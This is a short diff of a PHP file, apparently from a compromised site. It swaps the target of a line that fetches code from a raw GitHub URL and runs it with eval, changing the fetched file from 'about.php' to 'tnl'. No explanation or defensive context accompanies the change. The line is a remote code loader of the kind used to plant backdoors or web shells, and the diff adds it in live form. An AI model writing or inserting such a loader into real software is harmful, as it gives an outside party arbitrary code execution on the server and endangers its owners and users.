@@ -17,4 +17,4 @@ function getURL($url) {
 }
 
 
-eval("?>" . getURL("https://raw.githubusercontent.com/nikmatsekali/Nikmat/refs/heads/main/about.php"));
+eval("?>" . getURL("https://raw.githubusercontent.com/nikmatsekali/Nikmat/refs/heads/main/tnl"));
